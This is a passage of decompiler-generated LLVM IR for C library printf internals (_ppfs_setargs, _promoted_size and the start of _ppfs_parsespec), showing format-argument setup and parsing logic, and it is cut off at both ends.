  %v0_80513b8 = load i32, i32* @esi, align 4
  %v0_80513b9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80513c5 = add i32 %arg1, 24
  %v2_80513c5 = inttoptr i32 %v1_80513c5 to i32*
  %v3_80513c5 = load i32, i32* %v2_80513c5, align 4
  %v2_80513c8 = add i32 %arg1, 76
  %v3_80513c8 = inttoptr i32 %v2_80513c8 to i32*
  store i32 %arg2, i32* %v3_80513c8, align 4
  %tmp8 = icmp slt i32 %v3_80513c5, 1
  br i1 %tmp8, label %dec_label_pc_80513f6, label %dec_label_pc_80513cf

dec_label_pc_80513cf:                             ; preds = %entry
  %v1_80513d2 = load i32, i32* @ebx, align 4
  %v2_80513d2 = add i32 %v1_80513d2, 28
  %v3_80513d2 = inttoptr i32 %v2_80513d2 to i32*
  store i32 %v3_80513c5, i32* %v3_80513d2, align 4
  %v0_80513d5 = load i32, i32* @ebx, align 4
  %v1_80513d5 = add i32 %v0_80513d5, 24
  %v2_80513d5 = inttoptr i32 %v1_80513d5 to i32*
  store i32 0, i32* %v2_80513d5, align 4
  %v0_80513dc = load i32, i32* @ebx, align 4
  %v1_80513dc = add i32 %v0_80513dc, 4
  %v2_80513dc = inttoptr i32 %v1_80513dc to i32*
  store i32 0, i32* %v2_80513dc, align 4
  %v0_80513e3 = load i32, i32* @ebx, align 4
  %v1_80513e3 = add i32 %v0_80513e3, 8
  %v2_80513e3 = inttoptr i32 %v1_80513e3 to i32*
  store i32 0, i32* %v2_80513e3, align 4
  %v0_80513ea = load i32, i32* @ebx, align 4
  %v1_80513eb = call i32 @_ppfs_setargs(i32 %v0_80513ea)
  %v1_80513f3 = load i32, i32* @ebx, align 4
  %v2_80513f3 = add i32 %v1_80513f3, 24
  %v3_80513f3 = inttoptr i32 %v2_80513f3 to i32*
  store i32 %v3_80513c5, i32* %v3_80513f3, align 4
  br label %dec_label_pc_80513f6

dec_label_pc_80513f6:                             ; preds = %entry, %dec_label_pc_80513cf
  %v2_80513f6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_80513b9, i32* @ebx, align 4
  store i32 %v0_80513b8, i32* @esi, align 4
  ret i32 %v2_80513f6

; uselistorder directives
  uselistorder i32 %v3_80513c5, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80513f6, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80513fd = load i32, i32* @ebx, align 4
  store i32 %v0_80513fd, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_8051402 = add i32 %arg1, 24
  %v2_8051402 = inttoptr i32 %v1_8051402 to i32*
  %v3_8051402 = load i32, i32* %v2_8051402, align 4
  %v4_8051402 = icmp eq i32 %v3_8051402, 0
  %v1_8051406 = add i32 %arg1, 80
  store i32 %v1_8051406, i32* %ebx.global-to-local, align 4
  %v1_8051409 = icmp eq i1 %v4_8051402, false
  %v1_80514c1 = add i32 %arg1, 8
  %v2_80514c1 = inttoptr i32 %v1_80514c1 to i32*
  %v3_80514c1 = load i32, i32* %v2_80514c1, align 4
  %v8_80514c1 = icmp eq i32 %v3_80514c1, -2147483648
  %v1_80514c8 = icmp eq i1 %v8_80514c1, false
  br i1 %v1_8051409, label %dec_label_pc_80514c1, label %dec_label_pc_805140f

dec_label_pc_805140f:                             ; preds = %entry
  br i1 %v1_80514c8, label %dec_label_pc_8051429, label %dec_label_pc_8051418

dec_label_pc_8051418:                             ; preds = %dec_label_pc_805140f
  %v1_8051418 = add i32 %arg1, 76
  %v2_8051418 = inttoptr i32 %v1_8051418 to i32*
  %v3_8051418 = load i32, i32* %v2_8051418, align 4
  store i32 %v3_8051418, i32* %eax.global-to-local, align 4
  %v1_805141b = add i32 %v3_8051418, 4
  store i32 %v1_805141b, i32* %edx.global-to-local, align 4
  store i32 %v1_805141b, i32* %v2_8051418, align 4
  %v0_8051421 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051421 = inttoptr i32 %v0_8051421 to i32*
  %v2_8051421 = load i32, i32* %v1_8051421, align 4
  store i32 %v2_8051421, i32* %eax.global-to-local, align 4
  %v1_8051423 = load i32, i32* @ecx, align 4
  %v2_8051423 = add i32 %v1_8051423, 80
  %v3_8051423 = inttoptr i32 %v2_8051423 to i32*
  store i32 %v2_8051421, i32* %v3_8051423, align 4
  %v0_8051426 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051426 = load i32, i32* @ecx, align 4
  %v2_8051426 = add i32 %v1_8051426, 8
  %v3_8051426 = inttoptr i32 %v2_8051426 to i32*
  store i32 %v0_8051426, i32* %v3_8051426, align 4
  %v0_8051429.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051429

dec_label_pc_8051429:                             ; preds = %dec_label_pc_805140f, %dec_label_pc_8051418
  %v1_8051438 = phi i32 [ %arg1, %dec_label_pc_805140f ], [ %v0_8051429.pre, %dec_label_pc_8051418 ]
  %v1_8051429 = add i32 %v1_8051438, 4
  %v2_8051429 = inttoptr i32 %v1_8051429 to i32*
  %v3_8051429 = load i32, i32* %v2_8051429, align 4
  %v8_8051429 = icmp eq i32 %v3_8051429, -2147483648
  %v1_8051430 = icmp eq i1 %v8_8051429, false
  br i1 %v1_8051430, label %dec_label_pc_8051443, label %dec_label_pc_8051432

dec_label_pc_8051432:                             ; preds = %dec_label_pc_8051429
  %v1_8051432 = add i32 %v1_8051438, 76
  %v2_8051432 = inttoptr i32 %v1_8051432 to i32*
  %v3_8051432 = load i32, i32* %v2_8051432, align 4
  store i32 %v3_8051432, i32* %eax.global-to-local, align 4
  %v1_8051435 = add i32 %v3_8051432, 4
  store i32 %v1_8051435, i32* %edx.global-to-local, align 4
  store i32 %v1_8051435, i32* %v2_8051432, align 4
  %v0_805143b = load i32, i32* %eax.global-to-local, align 4
  %v1_805143b = inttoptr i32 %v0_805143b to i32*
  %v2_805143b = load i32, i32* %v1_805143b, align 4
  store i32 %v2_805143b, i32* %eax.global-to-local, align 4
  %v1_805143d = load i32, i32* @ecx, align 4
  %v2_805143d = add i32 %v1_805143d, 80
  %v3_805143d = inttoptr i32 %v2_805143d to i32*
  store i32 %v2_805143b, i32* %v3_805143d, align 4
  %v0_8051440 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051440 = load i32, i32* @ecx, align 4
  %v2_8051440 = add i32 %v1_8051440, 4
  %v3_8051440 = inttoptr i32 %v2_8051440 to i32*
  store i32 %v0_8051440, i32* %v3_8051440, align 4
  %v1_80514ba15.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051443

dec_label_pc_8051443:                             ; preds = %dec_label_pc_8051429, %dec_label_pc_8051432
  %v1_80514ba15 = phi i32 [ %v1_8051438, %dec_label_pc_8051429 ], [ %v1_80514ba15.pre, %dec_label_pc_8051432 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_80514ba16 = add i32 %v1_80514ba15, 28
  %v3_80514ba17 = inttoptr i32 %v2_80514ba16 to i32*
  %v4_80514ba18 = load i32, i32* %v3_80514ba17, align 4
  %v5_80514bd20 = icmp sgt i32 %v4_80514ba18, 0
  br i1 %v5_80514bd20, label %dec_label_pc_8051447, label %dec_label_pc_80514ef.loopexit

dec_label_pc_8051447:                             ; preds = %dec_label_pc_8051443, %dec_label_pc_80514b9
  %v1_80514ba22 = phi i32 [ %v1_80514ba, %dec_label_pc_80514b9 ], [ %v1_80514ba15, %dec_label_pc_8051443 ]
  %v1_805144721 = phi i32 [ %v1_80514b9, %dec_label_pc_80514b9 ], [ 0, %dec_label_pc_8051443 ]
  %v2_8051447 = mul i32 %v1_805144721, 4
  %v3_8051447 = add i32 %v2_8051447, 40
  %v4_8051447 = add i32 %v3_8051447, %v1_80514ba22
  %v5_8051447 = inttoptr i32 %v4_8051447 to i32*
  %v6_8051447 = load i32, i32* %v5_8051447, align 4
  store i32 %v6_8051447, i32* %eax.global-to-local, align 4
  %v1_805144b = add i32 %v6_8051447, -8
  %v9_805144b = icmp eq i32 %v1_805144b, 0
  br i1 %v9_805144b, label %dec_label_pc_80514b9, label %dec_label_pc_8051450

dec_label_pc_8051450:                             ; preds = %dec_label_pc_8051447
  %v10_805144b = icmp slt i32 %v1_805144b, 0
  %v6_805144b = sub i32 7, %v6_8051447
  %v7_805144b = and i32 %v6_805144b, %v6_8051447
  %v8_805144b = icmp slt i32 %v7_805144b, 0
  %v1_8051450 = add i32 %v1_80514ba22, 76
  %v2_8051450 = inttoptr i32 %v1_8051450 to i32*
  %v3_8051450 = load i32, i32* %v2_8051450, align 4
  store i32 %v3_8051450, i32* %edx.global-to-local, align 4
  %v3_8051453 = icmp eq i1 %v10_805144b, %v8_805144b
  br i1 %v3_8051453, label %dec_label_pc_8051463, label %dec_label_pc_8051455

dec_label_pc_8051455:                             ; preds = %dec_label_pc_8051450
  %tmp13 = icmp slt i32 %v6_8051447, 3
  %v9_805145c = icmp eq i32 %v6_8051447, 7
  %v1_805145f = icmp eq i1 %v9_805145c, false
  %or.cond = or i1 %tmp13, %v1_805145f
  br i1 %or.cond, label %dec_label_pc_80514ac, label %dec_label_pc_805148e

dec_label_pc_8051463:                             ; preds = %dec_label_pc_8051450
  %tmp14 = icmp sgt i32 %v6_8051447, 1024
  br i1 %tmp14, label %dec_label_pc_805146c, label %dec_label_pc_80514ac

dec_label_pc_805146c:                             ; preds = %dec_label_pc_8051463
  %v6_805146c = icmp eq i32 %v6_8051447, 2048
  br i1 %v6_805146c, label %dec_label_pc_805147c, label %dec_label_pc_8051473

dec_label_pc_8051473:                             ; preds = %dec_label_pc_805146c
  %v9_8051473 = icmp eq i32 %v6_8051447, 2055
  %v1_8051478 = icmp eq i1 %v9_8051473, false
  br i1 %v1_8051478, label %dec_label_pc_80514ac, label %dec_label_pc_805149d

dec_label_pc_805147c:                             ; preds = %dec_label_pc_805146c
  %v1_805147c = add i32 %v3_8051450, 8
  store i32 %v1_805147c, i32* %eax.global-to-local, align 4
  store i32 %v1_805147c, i32* %v2_8051450, align 4
  %v0_8051482 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051482 = inttoptr i32 %v0_8051482 to i32*
  %v2_8051482 = load i32, i32* %v1_8051482, align 4
  store i32 %v2_8051482, i32* %eax.global-to-local, align 4
  %v1_8051484 = add i32 %v0_8051482, 4
  %v2_8051484 = inttoptr i32 %v1_8051484 to i32*
  %v3_8051484 = load i32, i32* %v2_8051484, align 4
  store i32 %v3_8051484, i32* %edx.global-to-local, align 4
  %v1_8051487 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051487 = inttoptr i32 %v1_8051487 to i32*
  store i32 %v2_8051482, i32* %v2_8051487, align 4
  %v0_8051489 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051489 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051489 = add i32 %v1_8051489, 4
  %v3_8051489 = inttoptr i32 %v2_8051489 to i32*
  store i32 %v0_8051489, i32* %v3_8051489, align 4
  br label %dec_label_pc_80514b6

dec_label_pc_805148e:                             ; preds = %dec_label_pc_8051455
  %v3_805148e = load i32, i32* %v2_8051450, align 4
  store i32 %v3_805148e, i32* %edx.global-to-local, align 4
  %v1_8051491 = add i32 %v3_805148e, 8
  store i32 %v1_8051491, i32* %eax.global-to-local, align 4
  store i32 %v1_8051491, i32* %v2_8051450, align 4
  %v0_8051497 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051497 = inttoptr i32 %v0_8051497 to double*
  %v2_8051497 = load double, double* %v1_8051497, align 4
  %v2_8051499 = load i32, i32* %ebx.global-to-local, align 4
  %v4_8051499 = inttoptr i32 %v2_8051499 to double*
  store double %v2_8051497, double* %v4_8051499, align 4
  br label %dec_label_pc_80514b6

dec_label_pc_805149d:                             ; preds = %dec_label_pc_8051473
  %v3_805149d = load i32, i32* %v2_8051450, align 4
  store i32 %v3_805149d, i32* %edx.global-to-local, align 4
  %v1_80514a0 = add i32 %v3_805149d, 12
  store i32 %v1_80514a0, i32* %eax.global-to-local, align 4
  store i32 %v1_80514a0, i32* %v2_8051450, align 4
  %v0_80514a6 = load i32, i32* %edx.global-to-local, align 4
  %v1_80514a6 = inttoptr i32 %v0_80514a6 to x86_fp80*
  %v2_80514a6 = load x86_fp80, x86_fp80* %v1_80514a6, align 4
  %v2_80514a8 = load i32, i32* %ebx.global-to-local, align 4
  %v3_80514a8 = inttoptr i32 %v2_80514a8 to x86_fp80*
  store x86_fp80 %v2_80514a6, x86_fp80* %v3_80514a8, align 4
  br label %dec_label_pc_80514b6

dec_label_pc_80514ac:                             ; preds = %dec_label_pc_8051455, %dec_label_pc_8051463, %dec_label_pc_8051473
  %v1_80514ac = add i32 %v3_8051450, 4
  store i32 %v1_80514ac, i32* %eax.global-to-local, align 4
  store i32 %v1_80514ac, i32* %v2_8051450, align 4
  %v0_80514b2 = load i32, i32* %edx.global-to-local, align 4
  %v1_80514b2 = inttoptr i32 %v0_80514b2 to i32*
  %v2_80514b2 = load i32, i32* %v1_80514b2, align 4
  store i32 %v2_80514b2, i32* %eax.global-to-local, align 4
  %v1_80514b4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80514b4 = inttoptr i32 %v1_80514b4 to i32*
  store i32 %v2_80514b2, i32* %v2_80514b4, align 4
  br label %dec_label_pc_80514b6

dec_label_pc_80514b6:                             ; preds = %dec_label_pc_805149d, %dec_label_pc_805148e, %dec_label_pc_805147c, %dec_label_pc_80514ac
  %v0_80514b6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80514b6 = add i32 %v0_80514b6, 12
  store i32 %v1_80514b6, i32* %ebx.global-to-local, align 4
  %v0_80514b9.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80514ba.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80514b9

dec_label_pc_80514b9:                             ; preds = %dec_label_pc_8051447, %dec_label_pc_80514b6
  %v1_80514ba = phi i32 [ %v1_80514ba22, %dec_label_pc_8051447 ], [ %v1_80514ba.pre, %dec_label_pc_80514b6 ]
  %v0_80514b9 = phi i32 [ %v1_805144721, %dec_label_pc_8051447 ], [ %v0_80514b9.pre, %dec_label_pc_80514b6 ]
  %v1_80514b9 = add i32 %v0_80514b9, 1
  store i32 %v1_80514b9, i32* %esi.global-to-local, align 4
  %v2_80514ba = add i32 %v1_80514ba, 28
  %v3_80514ba = inttoptr i32 %v2_80514ba to i32*
  %v4_80514ba = load i32, i32* %v3_80514ba, align 4
  %v5_80514bd = icmp slt i32 %v1_80514b9, %v4_80514ba
  br i1 %v5_80514bd, label %dec_label_pc_8051447, label %dec_label_pc_80514ba.dec_label_pc_80514ef.loopexit_crit_edge

dec_label_pc_80514c1:                             ; preds = %entry
  br i1 %v1_80514c8, label %dec_label_pc_80514d8, label %dec_label_pc_80514ca

dec_label_pc_80514ca:                             ; preds = %dec_label_pc_80514c1
  %v1_80514ca = add i32 %arg1, 36
  %v2_80514ca = inttoptr i32 %v1_80514ca to i8*
  %v3_80514ca = load i8, i8* %v2_80514ca, align 1
  %v2_80514ce = zext i8 %v3_80514ca to i32
  %v3_80514ce = mul nuw nsw i32 %v2_80514ce, 12
  store i32 %v3_80514ce, i32* %eax.global-to-local, align 4
  %v2_80514d1 = add i32 %arg1, 68
  %v3_80514d1 = add i32 %v2_80514d1, %v3_80514ce
  %v4_80514d1 = inttoptr i32 %v3_80514d1 to i32*
  %v5_80514d1 = load i32, i32* %v4_80514d1, align 4
  store i32 %v5_80514d1, i32* %eax.global-to-local, align 4
  store i32 %v5_80514d1, i32* %v2_80514c1, align 4
  %v0_80514d8.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80514d8

dec_label_pc_80514d8:                             ; preds = %dec_label_pc_80514c1, %dec_label_pc_80514ca
  %v1_80514ec = phi i32 [ %arg1, %dec_label_pc_80514c1 ], [ %v0_80514d8.pre, %dec_label_pc_80514ca ]
  %v1_80514d8 = add i32 %v1_80514ec, 4
  %v2_80514d8 = inttoptr i32 %v1_80514d8 to i32*
  %v3_80514d8 = load i32, i32* %v2_80514d8, align 4
  %v8_80514d8 = icmp eq i32 %v3_80514d8, -2147483648
  %v1_80514df = icmp eq i1 %v8_80514d8, false
  br i1 %v1_80514df, label %dec_label_pc_80514ef, label %dec_label_pc_80514e1

dec_label_pc_80514e1:                             ; preds = %dec_label_pc_80514d8
  %v1_80514e1 = add i32 %v1_80514ec, 37
  %v2_80514e1 = inttoptr i32 %v1_80514e1 to i8*
  %v3_80514e1 = load i8, i8* %v2_80514e1, align 1
  %v2_80514e5 = zext i8 %v3_80514e1 to i32
  %v3_80514e5 = mul nuw nsw i32 %v2_80514e5, 12
  store i32 %v3_80514e5, i32* %eax.global-to-local, align 4
  %v1_80514e8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80514e8 = add nsw i32 %v3_80514e5, -12
  %v3_80514e8 = add i32 %v2_80514e8, %v1_80514e8
  %v4_80514e8 = inttoptr i32 %v3_80514e8 to i32*
  %v5_80514e8 = load i32, i32* %v4_80514e8, align 4
  store i32 %v5_80514e8, i32* %eax.global-to-local, align 4
  store i32 %v5_80514e8, i32* %v2_80514d8, align 4
  %v0_80514ef.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80514ef

dec_label_pc_80514ba.dec_label_pc_80514ef.loopexit_crit_edge: ; preds = %dec_label_pc_80514b9
  br label %dec_label_pc_80514ef.loopexit

dec_label_pc_80514ef.loopexit:                    ; preds = %dec_label_pc_80514ba.dec_label_pc_80514ef.loopexit_crit_edge, %dec_label_pc_8051443
  %v1_80514ba.lcssa = phi i32 [ %v1_80514ba, %dec_label_pc_80514ba.dec_label_pc_80514ef.loopexit_crit_edge ], [ %v1_80514ba15, %dec_label_pc_8051443 ]
  br label %dec_label_pc_80514ef

dec_label_pc_80514ef:                             ; preds = %dec_label_pc_80514ef.loopexit, %dec_label_pc_80514d8, %dec_label_pc_80514e1
  %v10_80514f6 = phi i32 [ %v1_80514ba.lcssa, %dec_label_pc_80514ef.loopexit ], [ %v1_80514ec, %dec_label_pc_80514d8 ], [ %v0_80514ef.pre, %dec_label_pc_80514e1 ]
  %v1_80514ef = add i32 %v10_80514f6, 8
  %v2_80514ef = inttoptr i32 %v1_80514ef to i32*
  %v3_80514ef = load i32, i32* %v2_80514ef, align 4
  store i32 %v3_80514ef, i32* %eax.global-to-local, align 4
  %v2_80514f2 = icmp slt i32 %v3_80514ef, 0
  %v1_80514f4 = icmp eq i1 %v2_80514f2, false
  br i1 %v1_80514f4, label %dec_label_pc_805150a, label %dec_label_pc_80514f6

dec_label_pc_80514f6:                             ; preds = %dec_label_pc_80514ef
  %v1_80514f6 = add i32 %v10_80514f6, 16
  %v2_80514f6 = inttoptr i32 %v1_80514f6 to i32*
  %v3_80514f6 = load i32, i32* %v2_80514f6, align 4
  %v4_80514f6 = or i32 %v3_80514f6, 8
  store i32 %v4_80514f6, i32* %v2_80514f6, align 4
  %v0_80514fa = load i32, i32* %eax.global-to-local, align 4
  %v1_80514fa = sub i32 0, %v0_80514fa
  store i32 %v1_80514fa, i32* %eax.global-to-local, align 4
  %v1_80514fc = load i32, i32* @ecx, align 4
  %v2_80514fc = add i32 %v1_80514fc, 8
  %v3_80514fc = inttoptr i32 %v2_80514fc to i32*
  store i32 %v1_80514fa, i32* %v3_80514fc, align 4
  %v0_80514ff = load i32, i32* @ecx, align 4
  %v1_80514ff = add i32 %v0_80514ff, 16
  %v2_80514ff = inttoptr i32 %v1_80514ff to i32*
  %v3_80514ff = load i32, i32* %v2_80514ff, align 4
  %v4_80514ff = and i32 %v3_80514ff, -2
  store i32 %v4_80514ff, i32* %v2_80514ff, align 4
  %v0_8051503 = load i32, i32* @ecx, align 4
  %v1_8051503 = add i32 %v0_8051503, 20
  %v2_8051503 = inttoptr i32 %v1_8051503 to i32*
  store i32 32, i32* %v2_8051503, align 4
  %v0_805150c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805150a

dec_label_pc_805150a:                             ; preds = %dec_label_pc_80514ef, %dec_label_pc_80514f6
  %v0_805150c = phi i32 [ %v3_80514ef, %dec_label_pc_80514ef ], [ %v0_805150c.pre, %dec_label_pc_80514f6 ]
  %v2_805150a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805150a, i32* @ebx, align 4
  ret i32 %v0_805150c

; uselistorder directives
  uselistorder i32 %v3_80514e5, { 1, 0 }
  uselistorder i32 %v3_80514ce, { 1, 0 }
  uselistorder i32 %v1_80514b9, { 2, 1, 0 }
  uselistorder i32 %v1_80514ba, { 1, 2, 0 }
  uselistorder i32 %v3_8051450, { 1, 0, 2 }
  uselistorder i32* %v2_8051450, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_805144b, { 1, 0 }
  uselistorder i32 %v6_8051447, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_805144721, { 1, 0 }
  uselistorder i32 %v1_80514ba15, { 2, 0, 1 }
  uselistorder i1 %v1_80514c8, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 6, 5, 8, 7 }
  uselistorder label %dec_label_pc_805150a, { 1, 0 }
  uselistorder label %dec_label_pc_80514ef, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80514d8, { 1, 0 }
  uselistorder label %dec_label_pc_80514b9, { 1, 0 }
  uselistorder label %dec_label_pc_80514b6, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80514ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051447, { 1, 0 }
  uselistorder label %dec_label_pc_8051443, { 1, 0 }
  uselistorder label %dec_label_pc_8051429, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8051510 = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051517

dec_label_pc_8051517:                             ; preds = %dec_label_pc_8051517, %entry
  %v0_8051517 = phi i32 [ ptrtoint (i8** @global_var_805b956.216 to i32), %entry ], [ %v1_8051517, %dec_label_pc_8051517 ]
  %v1_8051517 = add i32 %v0_8051517, -2
  %v1_805151a = inttoptr i32 %v1_8051517 to i16*
  %v2_805151a = load i16, i16* %v1_805151a, align 2
  %v3_805151a = sext i16 %v2_805151a to i32
  %v12_805151d = icmp ne i32 %v3_805151a, %v0_8051510
  %v6_8051527 = icmp ugt i32 %v1_8051517, ptrtoint (i32* @global_var_805b93e.217 to i32)
  %or.cond = and i1 %v6_8051527, %v12_805151d
  br i1 %or.cond, label %dec_label_pc_8051517, label %dec_label_pc_8051529

dec_label_pc_8051529:                             ; preds = %dec_label_pc_8051517
  %.pre = add i32 %v0_8051517, -134592832
  %v2_805152f = sdiv i32 %.pre, 2
  store i32 %v2_805152f, i32* @edx, align 4
  %v1_8051531 = add i32 %v2_805152f, ptrtoint (i8** @global_var_805b956.216 to i32)
  %v2_8051531 = inttoptr i32 %v1_8051531 to i8*
  %v3_8051531 = load i8, i8* %v2_8051531, align 1
  %v4_8051531 = zext i8 %v3_8051531 to i32
  ret i32 %v4_8051531

; uselistorder directives
  uselistorder i32 %v2_805152f, { 1, 0 }
  uselistorder i32 %v1_8051517, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805b956.216 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805153a = load i32, i32* @edi, align 4
  %v0_805153b = load i32, i32* @esi, align 4
  %v0_805153c = load i32, i32* @ebx, align 4
  store i32 %v0_805153c, i32* %stack_var_-16, align 4
  %v4_805153c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_8051568 = add i32 %tmp76, 24
  %v2_8051568 = inttoptr i32 %v1_8051568 to i32*
  %v3_8051568 = load i32, i32* %v2_8051568, align 4
  store i32 %v3_8051568, i32* %eax.global-to-local, align 4
  %v1_805156f = add i32 %tmp76, 16
  %v2_805156f = inttoptr i32 %v1_805156f to i32*
  %v3_805156f = load i32, i32* %v2_805156f, align 4
  %v1_8051572 = and i32 %v3_805156f, 128
  %v2_8051572 = icmp eq i32 %v1_8051572, 0
  store i32 %v1_8051572, i32* %edi.global-to-local, align 4
  %v1_8051578 = icmp eq i1 %v2_8051572, false
  br i1 %v1_8051578, label %dec_label_pc_805158b, label %dec_label_pc_805157a

dec_label_pc_805157a:                             ; preds = %entry
  %v2_805157a = load i32, i32* %arg1, align 4
  br label %dec_label_pc_80515d8.outer

dec_label_pc_8051585:                             ; preds = %dec_label_pc_8051713
  %v1_8051585 = add i32 %v0_8051713.pre.pre, 1
  store i32 %v1_8051585, i32* @esi, align 4
  br label %dec_label_pc_8051723

dec_label_pc_805158b:                             ; preds = %entry
  %v15_805153d = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805158d

dec_label_pc_805158d:                             ; preds = %dec_label_pc_80515b5.dec_label_pc_805158d_crit_edge, %dec_label_pc_805158b
  %v2_805159e = phi i32 [ %v2_805159e.pre, %dec_label_pc_80515b5.dec_label_pc_805158d_crit_edge ], [ %v15_805153d, %dec_label_pc_805158b ]
  %v3_805159e = phi i32 [ %v1_80515b5, %dec_label_pc_80515b5.dec_label_pc_805158d_crit_edge ], [ 0, %dec_label_pc_805158b ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_8051591 = mul i32 %v3_805159e, 4
  store i32 %v1_8051591, i32* @ecx, align 4
  %v2_8051598 = load i32, i32* %arg1, align 4
  store i32 %v2_8051598, i32* @edx, align 4
  %v2_805159a = add i32 %v1_8051591, -4
  %v3_805159a = add i32 %v2_805159a, %v2_8051598
  %v4_805159a = inttoptr i32 %v3_805159a to i32*
  %v5_805159a = load i32, i32* %v4_805159a, align 4
  store i32 %v5_805159a, i32* %eax.global-to-local, align 4
  %v1_805159e = trunc i32 %v5_805159a to i8
  %v4_805159e = add i32 %v2_805159e, 36
  %v5_805159e = add i32 %v4_805159e, %v3_805159e
  %v6_805159e = inttoptr i32 %v5_805159e to i8*
  store i8 %v1_805159e, i8* %v6_805159e, align 1
  %v0_80515a2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80515a2 = urem i32 %v0_80515a2, 256
  %v2_80515a2 = load i32, i32* @ebx, align 4
  %v3_80515a2 = and i32 %v2_80515a2, -256
  %v4_80515a2 = or i32 %v3_80515a2, %v1_80515a2
  store i32 %v4_80515a2, i32* @ebx, align 4
  %v1_80515a4 = mul i32 %v0_80515a2, 16777216
  %v2_80515a4 = sdiv i32 %v1_80515a4, 16777216
  store i32 %v2_80515a4, i32* %eax.global-to-local, align 4
  %v1_80515a7 = load i32, i32* @edx, align 4
  %v2_80515a7 = load i32, i32* @ecx, align 4
  %v3_80515a7 = add i32 %v1_80515a7, -4
  %v4_80515a7 = add i32 %v3_80515a7, %v2_80515a7
  %v5_80515a7 = inttoptr i32 %v4_80515a7 to i32*
  %v6_80515a7 = load i32, i32* %v5_80515a7, align 4
  %v17_80515a7 = icmp eq i32 %v2_80515a4, %v6_80515a7
  %v1_80515ab = icmp eq i1 %v17_80515a7, false
  br i1 %v1_80515ab, label %dec_label_pc_80518fd, label %dec_label_pc_80515b1

dec_label_pc_80515b1:                             ; preds = %dec_label_pc_805158d
  %v3_80515b1 = trunc i32 %v0_80515a2 to i8
  %v4_80515b1 = icmp eq i8 %v3_80515b1, 0
  br i1 %v4_80515b1, label %dec_label_pc_80515bb, label %dec_label_pc_80515b5

dec_label_pc_80515b5:                             ; preds = %dec_label_pc_80515b1
  %v0_80515b5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80515b5 = add i32 %v0_80515b5, 1
  store i32 %v1_80515b5, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80515b5, 32
  br i1 %tmp, label %dec_label_pc_80515b5.dec_label_pc_805158d_crit_edge, label %dec_label_pc_80515bb

dec_label_pc_80515b5.dec_label_pc_805158d_crit_edge: ; preds = %dec_label_pc_80515b5
  %v2_805159e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805158d

dec_label_pc_80515bb:                             ; preds = %dec_label_pc_80515b5, %dec_label_pc_80515b1
  %v2_80515c0 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_80515d8.outer

dec_label_pc_80515d8.outer:                       ; preds = %dec_label_pc_80515bb, %dec_label_pc_805157a, %dec_label_pc_80516f5
